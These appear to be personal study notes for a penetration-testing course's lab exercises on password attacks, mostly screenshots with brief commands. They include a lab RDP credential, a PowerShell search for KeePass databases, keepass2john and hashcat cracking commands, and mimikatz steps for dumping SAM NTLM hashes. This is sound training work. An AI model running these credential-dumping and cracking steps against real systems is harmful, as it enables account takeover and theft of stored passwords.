![[Pasted image 20231018195629.png]]
![[Pasted image 20231019184215.png]]

see the port #21 and 3389
![[Pasted image 20231019184345.png]]
got the information needed, next going to try to rdp into it
└─$ xfreerdp /v:192.168.208.202 /u:itadmin /p:hellokitty 
[18:44:12:592] [7443:7444] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[18:44:12:593] [7443:7444] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
2.0.8...2.0.2.
[18:44:13:663] [7443:7444] [INFO][com.winpr.sspi.NTLM] - [length=46] 
**[18:44:14:865] [7443:7444] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 104: Connection reset by peer**
[18:44:14:865] [7443:7444] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]
[18:44:14:865] [7443:7444] [ERROR][com.freerdp.core] - freerdp_post_connect failed

since it is reset by peer, I must find another way, trying FTP
![[Pasted image 20231019184709.png]]

### 15.1.2 HTTP POST
![[Pasted image 20231019190607.png]]

![[Pasted image 20231019200421.png]]

### 15.2.2 Question 1 & 2  (Rule-Based Attack)

[rule_based_attack [hashcat wiki]](https://hashcat.net/wiki/doku.php?id=rule_based_attack)

![[Pasted image 20231021050258.png]]
![[Pasted image 20231021050357.png]]

![[Pasted image 20231021050443.png]]


![[Pasted image 20231021050507.png]]
![[Pasted image 20231021051658.png]]

### 15.2.4 Password Manager Attack

after checking the apps and seeing a password manager, transfer the database to your Kali
**Use Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue**
according to the DB that you found
![[Pasted image 20231021055533.png]]
once found and transfer, remove the hashes from the DB using **Keepass2john**
and > to create a file
![[Pasted image 20231021055325.png]]

after looking for the type of hash using the 
hashcat --help | grep -i "KeePass"
we get the result and compare it to the hashcat reference
![[Pasted image 20231021060050.png]]

![[Pasted image 20231021060101.png]]

We run the cmd with the predetermined rules

hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

![[Pasted image 20231021060714.png]]

#### Question 2
![[Pasted image 20231021060740.png]]

![[Pasted image 20231021061519.png]]

![[Pasted image 20231021061534.png]]

Once I downloaded the file from the RDP session

![[Pasted image 20231021061942.png]]
once the password is found
go back to the machine and login with the master key
![[Pasted image 20231021062431.png]]
and you get the flag!

### 15.2.5 Question 2

![[Pasted image 20231021065138.png]]

![[Pasted image 20231021103124.png]]

![[Pasted image 20231021104730.png]]
check out the curl code
![[Pasted image 20231021104757.png]]
![[Pasted image 20231021104803.png]]
![[Pasted image 20231021104819.png]]

![[Pasted image 20231021155221.png]]
remove the id_rsa portion of  it
ad the rockyou.txt in the list
![[Pasted image 20231021155442.png]]

![[Pasted image 20231021155509.png]]


### 15.3.1 Cracking NTLM Question 2

![[Pasted image 20231021164943.png]]
![[Pasted image 20231021165006.png]]
go to mimikatz.exe
privilege::debug
token::elevate
lsadump::sam

![[Pasted image 20231021165157.png]]
after getting the NTLM
load it to Kali to crack it
after cracking it using hashcat -m 1000(NTLM code) steve.hash(hash transferred)
rockyou.txt(password list) /usr/share/hashcat/rules/rockyou-3000.rule --force
you get the password to rdp into system

perform the steps as the module suggests to get your 
![[Pasted image 20231021165457.png]]
### 15.3.2 Passing NTLM
perform the steps presented in the module. once in, you can search the flag
![[Pasted image 20231021172431.png]]





